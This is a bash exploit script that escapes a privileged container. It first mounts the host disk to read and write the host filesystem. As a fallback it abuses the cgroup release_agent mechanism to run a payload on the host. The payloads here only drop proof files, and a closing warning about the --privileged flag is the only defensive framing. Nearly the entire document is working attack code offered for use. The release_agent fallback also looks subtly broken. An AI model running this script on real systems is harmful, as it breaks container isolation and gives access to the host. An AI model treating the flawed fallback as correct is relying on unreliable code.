#!/bin/bash
# Container Escape Exploit Script
# For educational purposes only

echo "[*] Container Escape Exploit - Privileged Container"
echo "[*] This script demonstrates how to escape from a privileged container"

# Check if running in a privileged container
echo "[*] Checking for privileged status..."
if [ ! -f /proc/self/status ]; then
    echo "[-] Cannot access /proc/self/status. Are you in a container?"
    exit 1
fi

cap_eff=$(grep CapEff /proc/self/status | awk '{print $2}')
if [ "$cap_eff" != "0000003fffffffff" ] && [ "$cap_eff" != "0000001fffffffff" ]; then
    echo "[-] This container does not appear to be privileged. CapEff: $cap_eff"
    echo "[-] Expected 0000003fffffffff or 0000001fffffffff for privileged containers"
    exit 1
fi

echo "[+] Container appears to be privileged! Proceeding with exploit..."

# Method 1: Mount the host filesystem
echo "[*] Attempting to access host filesystem via disk device..."
echo "[*] Creating mount point at /tmp/host_root"
mkdir -p /tmp/host_root

# Find the main disk device
echo "[*] Listing available disk devices:"
fdisk -l 2>/dev/null | grep "Disk /dev/" | grep -v "loop"

# Ask user for the disk device
echo "[*] Enter the main host disk device to mount (e.g., /dev/xvda1, /dev/sda1):"
read disk_device

if [ ! -b "$disk_device" ]; then
    echo "[-] Invalid disk device: $disk_device"
    exit 1
fi

echo "[*] Attempting to mount $disk_device to /tmp/host_root"
if mount "$disk_device" /tmp/host_root; then
    echo "[+] Successfully mounted host filesystem!"
    echo "[+] Host filesystem is accessible at /tmp/host_root"
    echo "[*] Listing files in host root directory:"
    ls -la /tmp/host_root
    
    # Create a proof file
    echo "[*] Creating proof file on host at /tmp/host_root/tmp/container_was_here.txt"
    echo "Container escape was successful at $(date)" > /tmp/host_root/tmp/container_was_here.txt
    
    echo "[+] Escape successful! You now have access to the host filesystem."
    echo "[*] To clean up, run: umount /tmp/host_root"
else
    echo "[-] Failed to mount host filesystem. Trying alternative method..."
    
    # Method 2: Using cgroups Release Agent
    echo "[*] Attempting cgroups Release Agent method..."
    mkdir -p /tmp/escape
    
    if ! mount -t cgroup -o rdma cgroup /tmp/escape 2>/dev/null; then
        echo "[*] Trying alternative cgroup mount..."
        if ! mount -t cgroup -o memory cgroup /tmp/escape 2>/dev/null; then
            echo "[-] Could not mount cgroup filesystem. Failed to escape."
            exit 1
        fi
    fi
    
    echo "[+] Successfully mounted cgroup filesystem"
    mkdir -p /tmp/escape/x
    echo 1 > /tmp/escape/x/notify_on_release
    
    echo "[*] Creating payload to execute on the host"
    echo '#!/bin/bash' > /tmp/payload.sh
    echo 'echo "Container escape was successful at $(date)" > /tmp/container_was_here.txt' >> /tmp/payload.sh
    echo 'chmod 777 /tmp/container_was_here.txt' >> /tmp/payload.sh
    chmod +x /tmp/payload.sh
    
    echo "[*] Setting up release_agent to execute our payload"
    host_path=/tmp/escape/release_agent
    echo "/tmp/payload.sh" > $host_path
    chmod +x $host_path
    
    echo "[*] Triggering the exploit..."
    echo $$ > /tmp/escape/x/cgroup.procs
    
    echo "[*] Checking if the exploit worked..."
    if [ -f /tmp/host_root/tmp/container_was_here.txt ]; then
        echo "[+] Success! Found proof file at /tmp/host_root/tmp/container_was_here.txt"
        cat /tmp/host_root/tmp/container_was_here.txt
    else
        echo "[*] Could not confirm if exploit worked. Check /tmp/container_was_here.txt on the host."
    fi
fi

echo "[*] Exploit demonstration complete."
echo "[!] WARNING: This is a serious security vulnerability. In production environments, containers should NEVER run with the --privileged flag unless absolutely necessary." 